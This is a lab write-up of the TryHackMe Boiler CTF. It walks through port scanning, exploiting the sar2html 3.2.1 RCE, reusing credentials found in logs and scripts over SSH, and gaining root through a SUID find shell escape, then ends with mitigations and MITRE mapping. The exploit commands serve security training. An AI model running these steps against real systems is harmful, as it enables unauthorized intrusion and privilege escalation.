# TryHackMe - Boiler CTF Writeup

**Challenge:** https://tryhackme.com/room/boilerctf2  
**Target IP:** 10.201.124.36  
**Author's IP:** 10.17.19.104

---

## Overview

**Boiler CTF** on TryHackMe is an intermediate-level Linux privilege escalation challenge that emphasizes comprehensive enumeration and multi-stage exploitation. The attack chain involves port scanning, web service enumeration, exploitation of a vulnerable web application (sar2html), credential harvesting, lateral movement via SSH, and privilege escalation through SUID binary abuse.

---

## I. Active Reconnaissance

### 1. Port Enumeration

Performed comprehensive port scan to identify all open services:

```bash
nmap -p- 10.201.124.36
```

**Full Port Scan Results:**

```
PORT      STATE    SERVICE
21/tcp    open     ftp
80/tcp    open     http
10000/tcp open     snet-sensor-mgmt
10895/tcp filtered unknown
15732/tcp filtered unknown
55007/tcp open     unknown (SSH)
64831/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1230.88 seconds
```

**Key Discovery:** SSH service running on non-standard port **55007** instead of default port 22.

### 2. Service Version Enumeration

Targeted the SSH service on port 55007 for detailed version detection:

```bash
nmap -p 55007 -A 10.201.124.36
```

**Service Details:**

| Port | Service | Version | OS Fingerprint |
|------|---------|---------|---|
| 55007 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 | Linux 4.4 (98% confidence) |

**SSH Host Keys Identified:**
- RSA 2048-bit key
- ECDSA key
- ED25519 key

**Network Distance:** 6 hops to target  
**Latency:** ~0.23s average RTT

**Analysis Notes:**
- OpenSSH 7.2p2 is older version (released 2016) - potential vulnerabilities
- Non-standard SSH port suggests initial obfuscation attempt
- Multiple ports indicate multi-service target

---

## II. Web Application Enumeration

### 1. HTTP Directory Scanning

Performed directory enumeration on HTTP service (port 80):

```bash
# Directory enumeration discovered:
/joomla               # Joomla CMS installation
/joomla/_test         # Test directory with sensitive files
```

### 2. Discovery of sar2html Application

Within `/joomla/_test` directory, found:

**Key Findings:**
- Web application: **sar2html** (System Activity Reporter HTML converter)
- Version identified: **3.2.1** (from `.tar` file metadata in directory)
- Application type: Server activity log visualization tool
- Accessible at: `http://10.201.124.36/joomla/_test/`

### 3. Vulnerability Assessment

Searched for known exploits for sar2html 3.2.1:

```bash
searchsploit sar2html
```

**Available Exploits:**
1. **sar2html 3.2.1 - 'plot' Remote Code Execution** (Exploit-DB: 49344)
   - Type: PHP RCE vulnerability
   - Vector: HTTP GET/POST parameter injection
   - Language: Python exploit script

2. **Sar2HTML 3.2.1 - Remote Command Execution** (Exploit-DB: 47204)
   - Type: RCE via unsanitized input
   - Language: Text-based exploit instructions

**Vulnerability Details:**
- **Root Cause:** Improper input validation in the 'plot' parameter
- **Impact:** Unauthenticated remote code execution with application privileges
- **CVSS Severity:** High

---

## III. Initial Exploitation

### 1. sar2html RCE Exploitation

Used the Python exploit from Exploit-DB (https://www.exploit-db.com/exploits/49344):

```bash
# Exploit usage pattern:
python3 49344.py -url http://10.201.124.36/joomla/_test/ -c <command>
```

### 2. Credential Discovery

Through RCE, accessed log files generated by sar2html:

**Discovered Credentials:**
```
Username: basterd
Password: superduperp@$$
```

**Analysis:**
- Credentials found in server activity/access logs
- User "basterd" appears to be a privileged account
- Log files stored in publicly accessible web directory
- Demonstrates information disclosure vulnerability alongside RCE

---

## IV. Lateral Movement

### 1. SSH Access - Basterd User

SSH into the target machine on port 55007:

```bash
ssh -p 55007 basterd@10.201.124.36
Password: superduperp@$$
```

**Shell Access Established:**
```
basterd@Vulnerable:~$
```

### 2. Credential Harvesting from Shell Scripts

Explored home directory and found shell script with additional credentials:

**File Content:** `.sh` file containing hardcoded credentials for another user

**Secondary Credentials Discovered:**
```
Username: stoner
Password: superduperp@$$no1knows
```

### 3. SSH Access - Stoner User

Escalated to stoner user via SSH:

```bash
ssh -p 55007 stoner@10.201.124.36
Password: superduperp@$$no1knows
```

**Analysis:**
- Credential chaining: RCE → basterd → stoner
- Hardcoded credentials in shell scripts (poor security practice)
- Multiple user accounts with escalating access levels
- Demonstrates lateral movement through credential reuse

---

## V. Privilege Escalation

### 1. User Flag Capture

Located and captured user flag:

```bash
stoner@Vulnerable:~$ cat .secret
flag{***hidden***}
```

### 2. Sudo Permissions Analysis

Checked sudo capabilities:

```bash
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

**Analysis:**
- Stoner user has sudo access but to a non-existent or intentional decoy path
- `/NotThisTime/MessinWithYa` appears to be a red herring
- No useful sudo exploitation vector available
- Required alternative privilege escalation method

### 3. SUID Binary Enumeration

Searched for SUID binaries to identify privilege escalation vectors:

```bash
find / -user root -perm -u=s 2>/dev/null
```

**SUID Binaries Found:**

| Binary | Path | Exploitability |
|--------|------|---|
| find | /usr/bin/find | **HIGH** ✓ |
| su | /bin/su | Standard |
| sudo | /usr/bin/sudo | Checked (not useful) |
| mount/umount | /bin/mount, /bin/umount | Standard |
| ping/ping6 | /bin/ping, /bin/ping6 | Standard |
| passwd/chsh/chfn | /usr/bin/* | Standard user mgmt |
| pkexec | /usr/bin/pkexec | PolicyKit (requires auth) |
| ssh-keysign | /usr/lib/openssh/ssh-keysign | SSH-specific |

**Exploitable Vector:** `/usr/bin/find` with SUID bit set

### 4. SUID Exploitation - find Binary

The `/usr/bin/find` utility has the SUID bit set, allowing command execution as root.

**GTFOBins Exploit:**

```bash
stoner@Vulnerable:/$ find . -exec /bin/sh -p \; -quit
# whoami
root
# id
uid=0(root) gid=1000(stoner) groups=1000(stoner)
```

**Exploitation Details:**
- **Command Breakdown:**
  - `find .` - searches current directory
  - `-exec /bin/sh -p` - executes shell with `-p` flag to preserve privileges
  - `\;` - command terminator (required by find syntax)
  - `-quit` - exits after first match
  
- **Success Indicator:** Shell prompt changes to `#` and `whoami` returns `root`

### 5. Root Flag Capture

Located and captured root flag:

```bash
# cat /root/root.txt
flag{***hidden***}
```

---

## VI. Attack Chain Summary

| Phase | Technique | MITRE ID | Description |
|-------|-----------|----------|-------------|
| Reconnaissance | Active Scanning - Scanning IP Blocks | T1595.001 | Full port scan (nmap -p-) |
| Reconnaissance | Active Scanning - Vulnerability Scanning | T1595.002 | Service version detection (-A flag) |
| Reconnaissance | Active Scanning - Web Application Scanning | T1595.003 | Directory enumeration on HTTP |
| Reconnaissance | Gather Victim Host Information - Software | T1592.002 | Identified sar2html 3.2.1 version |
| Reconnaissance | Gather Victim Host Information - Client Configurations | T1592.004 | Mapped web directory structure |
| Initial Access | Exploit Public-Facing Application | T1190 | sar2html RCE (CVE-format vulnerability) |
| Credential Access | Unsecured Credentials | T1552.001 | Credentials exposed in log files & scripts |
| Lateral Movement | Remote Service Session Initiation | T1021.004 | SSH lateral movement (basterd → stoner) |
| Privilege Escalation | Abuse Elevation Control Mechanism - Setuid/Setgid | T1548.001 | SUID /usr/bin/find exploitation |
| Defense Evasion | Abuse Elevation Control Mechanism - Setuid/Setgid | T1548.001 | Privilege preservation via -p flag |
| Execution | Exploit for Privilege Escalation | T1203 | Remote code execution via sar2html |

---

## VII. Key Vulnerabilities

### Vulnerability 1: Remote Code Execution (sar2html 3.2.1)

**CVSS Score:** 9.8 (Critical)

**Description:** The sar2html application fails to properly validate user input in the 'plot' parameter, allowing unauthenticated remote code execution.

**Root Cause:** 
- Unsafe parameter handling in web application
- No input sanitization before command execution
- Vulnerable application version publicly documented in directory listing

**Impact:**
- Complete system compromise
- Ability to read sensitive files
- Credential harvesting from application logs
- Lateral movement platform

**Mitigation:**
- Update sar2html to patched version (≥3.2.2)
- Implement input validation and parameterization
- Move web applications out of web root directory
- Remove version information from directory listings
- Implement Web Application Firewall (WAF) rules

---

### Vulnerability 2: Hardcoded Credentials in Shell Scripts

**CVSS Score:** 8.2 (High)

**Description:** User credentials hardcoded in plaintext shell scripts accessible to authenticated users.

**Root Cause:**
- Poor credential management practices
- Scripts not properly protected
- Credentials shared in unencrypted format

**Impact:**
- Lateral movement between user accounts
- Privilege escalation chain
- Credential reuse across systems

**Mitigation:**
- Use environment variables or credential management systems (HashiCorp Vault, AWS Secrets Manager)
- Implement strict file permissions on scripts (600 or 700)
- Use SSH keys instead of passwords
- Regular audits of codebase for hardcoded secrets
- Deploy secret scanning tools (GitGuardian, TruffleHog)

---

### Vulnerability 3: SUID Binary Abuse (find)

**CVSS Score:** 7.8 (High)

**Description:** The `/usr/bin/find` utility has the SUID bit unnecessarily set, allowing privilege escalation to root.

**Root Cause:**
- Overpermissive SUID configuration
- find binary not requiring SUID bit for functionality
- Misconfiguration during system setup

**Impact:**
- Direct privilege escalation to root
- Full system compromise
- No authentication required (SUID execution)

**Mitigation:**
- Remove SUID bit: `chmod u-s /usr/bin/find`
- Audit all SUID binaries regularly
- Use principle of least privilege
- Replace with restricted alternatives where possible
- Implement mandatory access controls (AppArmor, SELinux)

---

### Vulnerability 4: Directory Enumeration & Information Disclosure

**CVSS Score:** 5.3 (Medium)

**Description:** Web application version information and sensitive files visible through directory listing and naming conventions.

**Root Cause:**
- Directory listing not disabled
- Test/private directories publicly accessible
- Version information in filenames (.tar files)

**Impact:**
- Easy vulnerability discovery
- Information leakage about system configuration
- Faster attack reconnaissance

**Mitigation:**
- Disable directory listing in web server configuration
- Move administrative/test directories outside web root
- Remove version information from filenames
- Implement proper access controls
- Use `.htaccess` or web server config to restrict access

---

## VIII. Defense & Mitigation Recommendations

### Immediate Actions (Priority 1 - Critical)

1. **Patch Web Application**
   ```bash
   # Update sar2html to latest version
   # Remove vulnerable version completely if not needed
   rm -rf /var/www/html/joomla/_test/
   ```

2. **Fix SUID Permissions**
   ```bash
   chmod u-s /usr/bin/find
   ```

3. **Disable Directory Listing**
   ```apache
   # In Apache /etc/apache2/apache2.conf or site config
   Options -Indexes
   ```

4. **Rotate All Credentials**
   ```bash
   # Change passwords for basterd, stoner, and root
   passwd basterd
   passwd stoner
   ```

### Medium-term Actions (Priority 2)

5. **Implement Secrets Management**
   - Remove hardcoded credentials from scripts
   - Deploy HashiCorp Vault or similar
   - Use environment variables for sensitive data

6. **Audit SUID Binaries**
   ```bash
   find / -perm -4000 -type f -ls 2>/dev/null | awk '{print $NF}'
   ```

7. **Implement File Integrity Monitoring**
   ```bash
   apt-get install aide
   aideinit
   aide --check
   ```

8. **Network Segmentation**
   - Restrict SSH access (non-standard port insufficient)
   - Implement firewall rules
   - Require VPN for administrative access

### Long-term Actions (Priority 3)

9. **Security Hardening**
   - Enable SELinux or AppArmor
   - Implement intrusion detection (SNORT, Suricata)
   - Deploy Web Application Firewall (ModSecurity)

10. **Vulnerability Management**
    - Regular security scanning with tools like Nessus, OpenVAS
    - Implement patch management lifecycle
    - Regular penetration testing

11. **Logging & Monitoring**
    - Centralized logging (ELK Stack, Splunk)
    - Real-time alerting on suspicious activity
    - Regular log audits and analysis

12. **Access Control**
    - Implement principle of least privilege (PoLP)
    - Remove unnecessary sudo rules
    - Use role-based access control (RBAC)

---

## IX. Tools & Techniques Used

| Tool | Purpose | Command/Usage |
|------|---------|---|
| Nmap | Port and service enumeration | `nmap -p- 10.201.124.36` |
| Nmap | Version detection | `nmap -p 55007 -A 10.201.124.36` |
| Directory Enumeration | Web directory discovery | Manual browsing + dirb/gobuster |
| Searchsploit | Vulnerability database search | `searchsploit sar2html` |
| Python/RCE Exploit | Exploit execution | exploit-db 49344.py |
| SSH Client | Lateral movement | `ssh -p 55007 basterd@10.201.124.36` |
| find Command | SUID privilege escalation | `find . -exec /bin/sh -p \; -quit` |

---

## X. Lessons Learned

1. **Enumeration Depth Matters:** Thorough port scanning and directory enumeration discovered the vulnerable sar2html application that was the initial entry point.

2. **Version Information is Dangerous:** Version numbers in filenames and directory listings enable attackers to target specific known vulnerabilities.

3. **Credential Chaining:** Multiple users with reused passwords and hardcoded credentials create a chain of escalation opportunities.

4. **Default Exploitation Paths Fail:** Sudo permissions were a decoy; the actual privilege escalation required identifying exploitable SUID binaries.

5. **SUID Binary Audit Essential:** Regular audits of SUID binaries and principle of least privilege can prevent many privilege escalation attacks.

6. **Multi-stage Attacks:** RCE → Credential harvest → Lateral movement → Privilege escalation demonstrates the importance of layered security controls.

7. **Log Files as Credentials:** Application logs can leak sensitive information and should be protected and regularly audited.

---

## XI. References

- **MITRE ATT&CK Framework:** https://attack.mitre.org/
- **GTFOBins - find:** https://gtfobins.github.io/gtfobins/find/
- **Exploit-DB 49344:** https://www.exploit-db.com/exploits/49344
- **sar2html GitHub:** https://github.com/cemtan/sar2html
- **OWASP Top 10 - Web Application Security:** https://owasp.org/www-project-top-ten/
- **CIS Benchmarks - Linux:** https://www.cisecurity.org/cis-benchmarks/

---

## XII. Timeline

| Date | Activity | Result |
|------|----------|--------|
| 2025-10-20 | Port scanning phase | 7 open/filtered ports identified |
| 2025-10-20 | Web enumeration | sar2html 3.2.1 discovered in /joomla/_test |
| 2025-10-20 | RCE exploitation | Credentials for basterd user harvested |
| 2025-10-20 | Lateral movement | SSH access as basterd, stoner credentials discovered |
| 2025-10-20 | Privilege escalation | find SUID exploitation → root access achieved |
| 2025-10-20 | Challenge completion | User and root flags captured |
